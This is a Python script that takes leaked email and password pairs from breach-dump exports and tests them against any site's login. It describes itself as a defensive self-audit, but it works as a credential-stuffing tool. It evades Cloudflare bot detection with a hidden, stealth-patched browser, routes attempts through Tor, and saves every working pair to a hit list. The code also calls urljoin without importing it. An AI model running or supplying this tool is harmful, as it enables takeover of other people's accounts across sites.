#!/usr/bin/env python3
# check_passwords.py — test whether the username+password pairs found by LeakSearch
# still work on a site you specify.
#
# Purpose: defensive audit of your own accounts. It reads a LeakSearch export (CSV
# with "email,password,breach_sites" or TXT with one "email:password" per line),
# takes the username+password pairs it contains, and tries each pair against the
# site's real login.
#
# Login approaches handled (auto-detected, no flags needed):
#   - classic HTML form, single step (username + password on one form)
#   - two-step logins: username-only page first, password page after
#   - password-only forms (site identifies the account by session)
#   - HTTP Basic Auth (--basic)
#   - JavaScript-driven login pages (no HTML <form>): falls back to driving an
#     INVISIBLE browser (patchright's stealth-patched Chrome for Testing,
#     launched headed but parked off-screen — never focused, nothing shown;
#     plain headless mode is detected and hard-blocked by modern bot-walls).
#     It fills the real inputs, clicks the real button, waits out Cloudflare
#     interstitials, and compares the outcome against a wrong-password
#     baseline run the same way. Every attempt runs in its own cookie-isolated
#     context.
#
# Modes:
#   default     stops at the first live pair (one hit ends the run)
#   --inventory keeps going through every pair with a fresh, isolated context
#               per attempt, and reports the FULL list of pairs still live.
#               Hits are appended to --out hits.csv the moment they happen
#               (an interrupted run keeps every hit found so far).
#
# Detection is heuristic (baseline failed-login comparison + form/field
# disappearance): results are "WORKS", "failed", "unclear (verify manually)",
# or "blocked (challenge — inconclusive)" when a bot-wall never cleared.
# Attempts are rate-limited (default 10s apart) to stay polite. Requires
# Python 3.12+ (built and tested on 3.14).
#
# Usage:
#   python3 check_passwords.py --url https://example.com/login --leaks leaks.csv
#   python3 check_passwords.py --url https://example.com/login --leaks leaks.csv --inventory --out hits.csv

import argparse
import csv
import json
import secrets
import shutil
import socket
import subprocess
import sys
import tempfile
import time
from contextlib import suppress
from dataclasses import dataclass
from html.parser import HTMLParser
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

import requests

MAX_ATTEMPTS_DEFAULT = 20
DEFAULT_DELAY = 10.0
STEP_WAIT = 6.0      # seconds to let the page process a submit
CF_WAIT = 90.0       # max seconds to wait out a Cloudflare interstitial
USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
USER_HINTS = ("user", "email", "login", "mail", "account", "nick")


@dataclass(slots=True)
class Outcome:
    """Result of one login attempt, in whatever mode the site demanded."""
    status: int | None = None
    path: str = ""
    length: int = 0
    mode: str = ""                 # single | two_step | password_only | browser
    form_gone: bool = False        # requests path: no password form after submit
    flag: str | None = None        # js_page | no_pw_form | challenge
    pw_present: int | None = None  # browser path: visible password inputs left
    err: bool = False              # browser path: site showed an error message
    auth_ok: bool | None = None    # basic path


class FormParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.forms: list[dict[str, Any]] = []
        self._form: dict[str, Any] | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        a = dict(attrs)
        if tag == "form":
            self._form = {"action": a.get("action", ""),
                          "method": (a.get("method") or "get").lower(),
                          "fields": []}
        elif tag == "input" and self._form is not None:
            self._form["fields"].append({"name": a.get("name", ""),
                                         "type": (a.get("type") or "text").lower(),
                                         "value": a.get("value", "")})
        elif tag == "button" and self._form is not None and a.get("type") == "submit" and a.get("name"):
            self._form["fields"].append({"name": a["name"], "type": "submit", "value": a.get("value", "")})

    def handle_endtag(self, tag: str) -> None:
        if tag == "form" and self._form is not None:
            self.forms.append(self._form)
            self._form = None


def parse_forms(html: str) -> list[dict[str, Any]]:
    parser = FormParser()
    parser.feed(html)
    return parser.forms


def has_password_field(form: dict[str, Any]) -> bool:
    return any(f["type"] == "password" for f in form["fields"])


def password_form(forms: list[dict[str, Any]]) -> dict[str, Any] | None:
    for form in forms:
        if has_password_field(form):
            return form
    return None


def user_only_form(forms: list[dict[str, Any]]) -> dict[str, Any] | None:
    """A form that can carry a username but has no password field (two-step step 1)."""
    for form in forms:
        if has_password_field(form):
            continue
        if any(f["type"] in ("text", "email", "tel") for f in form["fields"]):
            return form
    return None


def build_payload(form: dict[str, Any], username: str, password: str) -> dict[str, str]:
    """Fill a parsed form: hidden fields preserved, password fields get the
    password, the first username-ish field (or the first text field as fallback)
    gets the username."""
    payload: dict[str, str] = {}
    user_fields: list[str] = []
    fallback: str | None = None
    for f in form["fields"]:
        name, ftype = f["name"], f["type"]
        if not name or ftype in ("submit", "button", "image"):
            continue
        if ftype == "hidden":
            payload[name] = f["value"]  # keep CSRF and friends
        elif ftype == "password":
            payload[name] = password
        elif ftype in ("text", "email", "tel"):
            if ftype == "email" or any(h in name.lower() for h in USER_HINTS):
                user_fields.append(name)
            elif fallback is None:
                fallback = name
        elif ftype == "checkbox":
            payload[name] = f["value"]
        else:
            payload[name] = f["value"]
    for i, name in enumerate(user_fields):
        payload[name] = username if i == 0 else ""
    if not user_fields and fallback is not None:
        payload[fallback] = username
    return payload


def submit_form(session: requests.Session, form: dict[str, Any], action: str, method: str,
                username: str, password: str) -> requests.Response:
    if method == "get":
        return session.get(action, params=build_payload(form, username, password), timeout=30, allow_redirects=True)
    return session.post(action, data=build_payload(form, username, password), timeout=30, allow_redirects=True)


def request_attempt(session: requests.Session, url: str, username: str, password: str) -> Outcome:
    """Submit one pair through the site's HTML forms, auto-detecting the flow.

    WordPress (wp-login.php) expects a 'wordpress_test_cookie' that its page
    JavaScript sets on load; a plain HTTP client never runs it, so it is set
    whenever the tell-tale hidden 'testcookie' field is present.
    """
    resp = session.get(url, timeout=30, allow_redirects=True)
    forms = parse_forms(resp.text)

    if any(f["name"] == "testcookie" for form in forms for f in form["fields"]):
        session.cookies.set("wordpress_test_cookie", "WP Cookie check")

    pw_form = password_form(forms)
    if pw_form is not None:
        action = urljoin(resp.url, pw_form["action"] or url)
        mode = "password_only" if not any(
            f["type"] in ("text", "email", "tel") for f in pw_form["fields"]) else "single"
        final = submit_form(session, pw_form, action, pw_form["method"], username, password)
    elif (user_form := user_only_form(forms)) is not None:
        action = urljoin(resp.url, user_form["action"] or url)
        resp2 = submit_form(session, user_form, action, user_form["method"], username, "")
        forms2 = parse_forms(resp2.text)
        pw_form2 = password_form(forms2)
        if pw_form2 is None:
            return Outcome(flag="no_pw_form", status=resp2.status_code,
                           path=urlparse(resp2.url).path, length=len(resp2.content))
        action2 = urljoin(resp2.url, pw_form2["action"] or resp2.url)
        mode = "two_step"
        final = submit_form(session, pw_form2, action2, pw_form2["method"], username, password)
    else:
        return Outcome(flag="js_page", status=resp.status_code,
                       path=urlparse(resp.url).path, length=len(resp.content))

    return Outcome(mode=mode, status=final.status_code, path=urlparse(final.url).path,
                   length=len(final.content),
                   form_gone=password_form(parse_forms(final.text)) is None)


def classify_requests(out: Outcome, base: Outcome) -> str:
    """Compare one attempt outcome against the wrong-password baseline outcome."""
    if out.flag or base.flag:
        return "failed" if out.flag == base.flag else "unclear (verify manually)"
    same_sig = (out.status, out.path) == (base.status, base.path)
    similar_len = abs(out.length - base.length) <= max(256, base.length // 20)
    if out.form_gone:
        return "WORKS (login form gone after submit)" if not same_sig else "unclear (verify manually)"
    if not same_sig and not similar_len:
        return "probably WORKS (different response than a failed login - verify manually)"
    return "failed"


# ---------------------------------------------------------------- invisible browser (patchright + CDP)
#
# Stake-grade Cloudflare detects headless Chromium and never clears, so the
# driver runs a HEADED stealth-patched "Google Chrome for Testing" launched
# with `open -g` (never brought to the foreground) and parked far off-screen:
# nothing is visible, nothing steals focus, and the wall clears in seconds.
# One app instance serves the whole run with a throwaway profile; every
# attempt gets a fresh, cookie-isolated context. A Cloudflare interstitial is
# waited out (up to CF_WAIT); if it never clears the attempt is reported as
# "blocked (challenge)" instead of a meaningless "failed".

_CF_MARKERS = ("just a moment", "checking your browser", "attention required",
               "verify you are human", "confirm you are human", "cf-chl",
               "performing security verification")

_PW: Any = None        # started sync_playwright()
_BROWSER: Any = None   # CDP-connected Chrome for Testing
_CDP_PORT = 0
_PROFILE_DIR: str | None = None
_CF_COOKIES: list[dict[str, Any]] | None = None   # cf_clearance/__cf_bm (bot-check only)


def _find_chrome_app() -> str:
    matches = sorted(Path.home().glob(
        "Library/Caches/ms-playwright/chromium-*/chrome-mac-arm64/Google Chrome for Testing.app"))
    if not matches:
        print("[!] No 'Google Chrome for Testing' installed — run: python -m patchright install chromium")
        sys.exit(1)
    return str(matches[-1])


def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def _hide_app() -> None:
    """Hide the browser app (Cmd-H state): its windows never render on screen.
    This is what makes the run invisible — macOS ignores off-screen window
    positions, and the Chrome-for-Testing AppleScript dictionary has no `hide`
    command, so this goes through System Events."""
    with suppress(Exception):
        subprocess.run(["osascript", "-e",
                        'tell application "System Events" to set visible of process '
                        '"Google Chrome for Testing" to false'],
                       timeout=15)


def _launch_browser(proxy: str | None = None) -> Any:
    global _PW, _BROWSER, _CDP_PORT, _PROFILE_DIR
    if _BROWSER is not None:
        return _BROWSER
    from patchright.sync_api import sync_playwright
    _PW = sync_playwright().start()
    app = _find_chrome_app()
    _CDP_PORT = _free_port()
    _PROFILE_DIR = tempfile.mkdtemp(prefix="ls_chrome_profile_")
    # socks5h (remote DNS) is a curl-ism; Chromium's socks5 proxies through the
    # exit for DNS by default in practice.
    chrome_proxy = proxy.replace("socks5h://", "socks5://") if proxy else None
    argv = ["open", "-g", "-a", app, "--args",
            f"--user-data-dir={_PROFILE_DIR}", f"--remote-debugging-port={_CDP_PORT}",
            "--window-position=-32000,-32000", "--window-size=1400,900",
            # throwaway profile + no persistent state: skip the macOS Keychain
            # entirely (Chrome otherwise prompts for its 'Chrome Safe Storage'
            # key on every fresh profile) and deny every other permission popup
            "--use-mock-keychain", "--deny-permission-prompts",
            # the app gets hidden (Cmd-H) right after launch — keep the pages
            # running at full speed while hidden (macOS would otherwise throttle
            # the hidden renderer and stall the Cloudflare challenge)
            "--disable-background-timer-throttling",
            "--disable-renderer-backgrounding",
            "--disable-backgrounding-occluded-windows",
            "--no-first-run", "--no-default-browser-check", "about:blank"]
    if chrome_proxy:
        argv.insert(4, f"--proxy-server={chrome_proxy}")
    subprocess.run(argv, check=True)
    import urllib.error
    import urllib.request
    for _ in range(30):
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{_CDP_PORT}/json/version", timeout=2)
            break
        except Exception:
            time.sleep(1)
    else:
        print("[!] The browser's debugging port never came up (is another instance of "
              "'Google Chrome for Testing' already running with different flags? Quit it and retry).")
        _shutdown_browser()
        sys.exit(1)
    _BROWSER = _PW.chromium.connect_over_cdp(f"http://127.0.0.1:{_CDP_PORT}", timeout=30000)
    _hide_app()  # never visible from this point on
    return _BROWSER


def _shutdown_browser() -> None:
    global _PW, _BROWSER, _PROFILE_DIR
    if _BROWSER is not None:
        with suppress(Exception):
            _BROWSER.close()
    if _PW is not None:
        with suppress(Exception):
            _PW.stop()
    with suppress(Exception):
        subprocess.run(["osascript", "-e", 'tell application "Google Chrome for Testing" to quit'],
                       timeout=30)
    if _PROFILE_DIR:
        shutil.rmtree(_PROFILE_DIR, ignore_errors=True)
    _PW = _BROWSER = None
    _PROFILE_DIR = None


# Mark the fields we intend to drive, so Playwright's proper fill() (which fires
# the events React-style frameworks listen for) can target them by attribute.
_MARK_JS = (
    '(() => { '
    'const vis = (el) => (el.offsetWidth || el.offsetHeight); '
    'document.querySelectorAll("[data-ls-user],[data-ls-pw],[data-ls-btn]").forEach((el) => { '
    'el.removeAttribute("data-ls-user"); el.removeAttribute("data-ls-pw"); el.removeAttribute("data-ls-btn"); }); '
    'const inputs = Array.from(document.querySelectorAll("input")).filter(vis); '
    'const hinted = (el) => { '
    'const n = ((el.name || "") + " " + (el.id || "") + " " + (el.placeholder || "") + " " '
    '+ (el.getAttribute("aria-label") || "")).toLowerCase(); '
    'return __HINTS__.some((h) => n.indexOf(h) >= 0); '
    '}; '
    'let user = null, pw = null, fallback = null; '
    'for (const el of inputs) { '
    'const t = (el.type || "text").toLowerCase(); '
    'if (t === "password" && !el.disabled && !el.readOnly && pw === null) { pw = el; } '
    'else if ((t === "text" || t === "email" || t === "tel") && !el.disabled && !el.readOnly '
    '&& el.form && user === null) { '
    'if (hinted(el)) { user = el; } else if (fallback === null) { fallback = el; } } '
    '} '
    'if (user === null) { user = fallback; } '
    'if (user) { user.setAttribute("data-ls-user", "1"); } '
    'if (pw) { pw.setAttribute("data-ls-pw", "1"); } '
    'const btns = Array.from(document.querySelectorAll("button, input[type=submit], [role=button]")).filter(vis); '
    'const txt = (el) => (((el.innerText || el.value || "") + "")).toLowerCase(); '
    'let b = btns.find((el) => el.type === "submit"); '
    'if (!b) { b = btns.find((el) => { const t = txt(el); '
    'return t.indexOf("log in") >= 0 || t.indexOf("login") >= 0 || t.indexOf("sign in") >= 0 '
    '|| t.indexOf("continue") >= 0 || t.indexOf("submit") >= 0; }); } '
    'if (!b) { b = btns.find((el) => el.tagName === "BUTTON"); } '
    'if (b) { b.setAttribute("data-ls-btn", "1"); } '
    'return JSON.stringify({user: !!user, pw: !!pw, btn: !!b}); '
    '})()'
).replace("__HINTS__", json.dumps(list(USER_HINTS)))

_STATE_JS = (
    '(() => { '
    'const vis = (el) => (el.offsetWidth || el.offsetHeight); '
    'const pws = Array.from(document.querySelectorAll("input[type=password]")).filter(vis); '
    'const body = document.body ? document.body.innerText : ""; '
    'const cf = /just a moment|checking your browser|attention required|verify you are human|'
    'confirm you are human|performing security verification/i.test(body); '
    'const err = /incorrect|invalid|wrong password|username or password|does not exist|'
    'unable to|could not|try again|failed/i.test(body); '
    'return JSON.stringify({url: location.href, pw: pws.length, len: body.length, cf: cf, err: err}); '
    '})()'
)


def _page_state(page: Any) -> dict[str, Any]:
    try:
        return json.loads(page.evaluate(_STATE_JS))
    except Exception:
        return {}


def _mark(page: Any) -> dict[str, Any]:
    try:
        return json.loads(page.evaluate(_MARK_JS))
    except Exception:
        return {}


def browser_attempt(url: str, username: str, password: str, proxy: str | None = None) -> Outcome:
    """One pair in a fresh, cookie-isolated headless context: wait out any
    Cloudflare interstitial, fill the real inputs, submit, read the outcome.
    Walks multi-stage flows (username page -> password page) automatically."""
    global _CF_COOKIES
    outcome = Outcome(pw_present=1)
    browser = _launch_browser(proxy)
    context = browser.new_context()
    try:
        page = context.new_page()
        _hide_app()  # a fresh context window could theoretically unhide the app
        if _CF_COOKIES:
            # pre-seed the site-wide bot-check cookies (never account session
            # cookies) so fresh contexts skip the Cloudflare interstitial
            with suppress(Exception):
                context.add_cookies(_CF_COOKIES)
        page.goto(url, wait_until="domcontentloaded", timeout=60000)

        # Wait out the Cloudflare interstitial until the login form is usable.
        ready, mark = False, {}
        deadline = time.monotonic() + CF_WAIT
        while time.monotonic() < deadline:
            st = _page_state(page)
            if not st:
                time.sleep(2)
                continue
            if st.get("cf"):
                time.sleep(2)
                continue
            mark = _mark(page)
            if mark.get("pw"):
                ready = True
                break
            if mark.get("btn") and not mark.get("user"):
                # login form not open yet — its opener button was marked; click it
                with suppress(Exception):
                    page.click("[data-ls-btn]", timeout=3000)
            time.sleep(2)

        if not ready:
            st = _page_state(page)
            if st.get("cf") or not st:
                return Outcome(flag="challenge")
            return Outcome(path=urlparse(str(page.url)).path,
                           pw_present=int(st.get("pw", 0)), length=int(st.get("len", 0)))

        # remember the bot-check cookies that got us in (cf_clearance,
        # __cf_bm — strictly NOT login/session cookies, keeping every
        # attempt isolated)
        with suppress(Exception):
            cf = [c for c in context.cookies() if c["name"].lower().startswith(("cf", "__cf"))]
            if cf:
                _CF_COOKIES = cf

        # Fill and submit, walking multi-stage flows (up to 3 stages).
        for _ in range(3):
            mark = _mark(page)
            if not mark.get("pw") and not mark.get("user"):
                break  # nothing recognizable to submit — stop walking
            try:
                if mark.get("user"):
                    page.fill("[data-ls-user]", username, timeout=5000)
                if mark.get("pw"):
                    page.fill("[data-ls-pw]", password, timeout=5000)
            except Exception:
                break
            with suppress(Exception):
                page.click("[data-ls-btn]", timeout=5000)
            time.sleep(STEP_WAIT)
            st = _page_state(page)
            if not st:
                break
            outcome = Outcome(path=urlparse(st["url"]).path,
                              pw_present=int(st["pw"]), length=int(st["len"]),
                              err=bool(st.get("err")))
            if mark.get("pw"):
                break  # password was submitted this stage — final state reached
        return outcome
    finally:
        with suppress(Exception):
            context.close()


def classify_browser(out: Outcome, base: Outcome) -> str:
    """Compare one attempt outcome against the wrong-password baseline outcome."""
    if out.flag == "challenge":
        return "blocked (challenge — inconclusive)"
    if out.pw_present == 0 and base.pw_present and base.pw_present > 0:
        return "WORKS (password field gone after submit)"
    if out.err and not base.err:
        return "failed (site showed an error message)"
    if out.path != base.path:
        return "probably WORKS (different response than a failed login - verify manually)"
    if abs(out.length - base.length) <= max(64, base.length // 10):
        return "failed"
    return "unclear (verify manually)"


def extract_pairs(path: str) -> list[tuple[str, str, str]]:
    """Pull (username, password, breach_sites) triples from a LeakSearch CSV or TXT export."""
    triples: list[tuple[str, str, str]] = []
    text = Path(path).read_text(encoding="utf-8", errors="ignore")
    if path.lower().endswith(".csv"):
        for row in csv.reader(text.splitlines()):
            if len(row) >= 2 and row[0].strip() and row[1].strip():
                if row[0].strip().lower() == "email" and row[1].strip().lower() == "password":
                    continue  # the CSV header, not a pair
                triples.append((row[0].strip(), row[1], row[2] if len(row) >= 3 else ""))
    else:
        for line in text.splitlines():
            if ":" in line:
                ident, pw = line.split(":", 1)
                if ident.strip() and pw.strip():
                    triples.append((ident.strip(), pw, ""))
    seen: set[tuple[str, str]] = set()
    unique: list[tuple[str, str, str]] = []
    for user, pw, breach in triples:
        if (user.lower(), pw) not in seen:
            seen.add((user.lower(), pw))
            unique.append((user, pw, breach))
    return unique


def new_session(proxy: str | None) -> requests.Session:
    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session


def _append_hit(path: str, user: str, password: str, breach: str) -> None:
    """Crash-safe: every hit is appended to the CSV the moment it is found."""
    new_file = not Path(path).exists()
    with open(path, "a", encoding="utf-8", newline="") as fh:
        writer = csv.writer(fh)
        if new_file:
            writer.writerow(["email", "password", "breach_sites"])
        writer.writerow([user, password, breach])


def main() -> None:
    if sys.version_info < (3, 12):
        print("[!] check_passwords.py requires Python 3.12+ (you have "
              f"{sys.version_info.major}.{sys.version_info.minor}).")
        sys.exit(1)

    ap = argparse.ArgumentParser(description="Test LeakSearch username+password pairs against a site's login.")
    ap.add_argument("--url", required=True, help="Login page URL (or resource URL for --basic)")
    ap.add_argument("--leaks", required=True, help="LeakSearch CSV or TXT export with the pairs to test")
    ap.add_argument("--inventory", action="store_true",
                    help="Full inventory: keep testing after hits (fresh isolated context per attempt) "
                         "and report every pair still live")
    ap.add_argument("--out", default=None, help="With --inventory: save the live pairs to this CSV "
                                                "(email,password,breach_sites); written incrementally")
    ap.add_argument("--basic", action="store_true", help="Site uses HTTP Basic Auth instead of a login form")
    ap.add_argument("--browser", action="store_true", help="Force the headless-browser fallback "
                                                           "(auto-enters it anyway when the page has no HTML form)")
    ap.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="Seconds between attempts (default 10)")
    ap.add_argument("--max", type=int, default=MAX_ATTEMPTS_DEFAULT, help="Maximum pairs to test "
                                                                          "(default 20; 0 = unlimited)")
    ap.add_argument("--proxy", default=None, help="Proxy for all attempts (e.g. socks5h://127.0.0.1:9050 for Tor, "
                                                  "http://127.0.0.1:8080) — honored by requests AND the headless browser")
    args = ap.parse_args()

    if args.out and not args.inventory:
        print("[!] --out only applies with --inventory.")
        sys.exit(1)

    pairs = extract_pairs(args.leaks)
    if not pairs:
        print(f"[!] No username/password pairs found in {args.leaks}")
        sys.exit(1)
    if args.max > 0:
        pairs = pairs[:args.max]
    print(f"[*] {len(pairs)} unique pair(s) to test against {args.url}"
          + (" (inventory: testing all, continuing after hits)" if args.inventory else ""))

    host = urlparse(args.url).netloc
    mode = "basic" if args.basic else "requests"
    proxy = args.proxy

    if proxy:
        print(f"[*] Routing attempts through {proxy}..")
        probe = new_session(proxy).get("https://check.torproject.org/api/ip", timeout=60).json()
        print(f"[*] Exit check: IsTor={probe.get('IsTor')} ip={probe.get('IP')}")

    baseline_user, baseline_pw = pairs[0][0], "definitely-wrong-" + secrets.token_hex(8)

    match mode:
        case "basic":
            baseline_resp = new_session(proxy).get(args.url, timeout=30, allow_redirects=True,
                                                   auth=(baseline_user, baseline_pw))
            baseline = Outcome(auth_ok=False, status=baseline_resp.status_code)
            print(f"[*] Baseline (wrong password, Basic Auth): status {baseline.status}")
        case _:
            print("[*] Establishing a failed-login baseline with a random wrong password..")
            baseline = request_attempt(new_session(proxy), args.url, baseline_user, baseline_pw)
            if baseline.flag == "js_page" or args.browser:
                if baseline.flag == "js_page":
                    print("[*] No HTML form found — the page looks JavaScript-driven.")
                print("[*] Falling back to an INVISIBLE browser (stealth Chrome for Testing, "
                      "off-screen and unfocused; each attempt in its own isolated context)..")
                mode = "browser"
                _launch_browser(proxy)
                baseline = browser_attempt(args.url, baseline_user, baseline_pw, proxy)
                if baseline.flag == "challenge":
                    print("[!] Cloudflare challenge never cleared even for the baseline — results would "
                          "be meaningless. (Try again later, or without --proxy: many Tor exits are "
                          "hard-blocked by Cloudflare.)")
                    _shutdown_browser()
                    sys.exit(1)
            elif baseline.flag == "no_pw_form":
                print("[!] Submitted the username but no password form appeared — the site may use a flow "
                      "this script can't follow.")
                sys.exit(1)
            else:
                note = {"single": "single-step form",
                        "password_only": "password-only form (site identifies the account by session)"
                        }.get(baseline.mode, baseline.mode)
                print(f"[*] Baseline: {note}, status {baseline.status}, path {baseline.path}, "
                      f"{baseline.length} bytes")
            print("[i] Baseline uses pairs[0]'s username with a wrong password (one extra failed "
                  "attempt on that account).")

    results: list[tuple[str, str, str, str]] = []
    hits: list[tuple[str, str, str]] = []
    for index, (user, password, breach) in enumerate(pairs, 1):
        time.sleep(args.delay if index > 1 else 0)
        verdict = "failed"
        match mode:
            case "basic":
                # Inventory: a fresh session per attempt so one success can't
                # authenticate later attempts.
                resp = new_session(proxy).get(args.url, timeout=30, allow_redirects=True, auth=(user, password))
                outcome = Outcome(auth_ok=resp.status_code == 200, status=resp.status_code)
                verdict = "WORKS" if resp.status_code == 200 else "failed"
            case "browser":
                # Fresh, cookie-isolated headless context per attempt: one success
                # can never authenticate later attempts.
                outcome = browser_attempt(args.url, user, password, proxy)
                verdict = classify_browser(outcome, baseline)
            case _:
                outcome = request_attempt(new_session(proxy), args.url, user, password)
                verdict = classify_requests(outcome, baseline)

        results.append((user, password, breach, verdict))
        flag = "WORKS" if verdict.startswith(("WORKS", "probably")) else verdict
        extra = f" status={outcome.status}" if outcome.status is not None else \
                (f" pw_present={outcome.pw_present}" + (" site-error" if outcome.err else ""))
        print(f"  [{index}/{len(pairs)}] {user:40} {flag:52} pw={'<len %d>' % len(password)}{extra}", flush=True)

        if flag == "WORKS":
            hits.append((user, password, breach))
            if args.out:
                _append_hit(args.out, user, password, breach)  # saved immediately — interrupt-proof
            if not args.inventory:
                if mode in ("browser", "requests"):
                    print("[*] Session now logged in — further attempts would be unreliable, stopping here.")
                break

    print("\n===== RESULTS =====")
    for user, password, breach, verdict in results:
        shown = password if verdict.startswith(("WORKS", "probably")) else "*failed* " + password[:3] + ".."
        site = f"  [from {breach}]" if breach else ""
        print(f"  {user:40} {verdict:52} password={shown}{site}")

    if hits:
        print(f"\n[!] {len(hits)} pair(s) still live on {host}:")
        for user, password, breach in hits:
            site = f"  [from {breach}]" if breach else ""
            print(f"      {user}  /  {password}{site}")
        if args.out:
            print(f"[+] Hit list saved to {args.out} (appended live during the run)")
    else:
        print("\n[+] None of the leaked pairs appear to be live on this site.")

    if mode == "browser":
        _shutdown_browser()


if __name__ == "__main__":
    main()
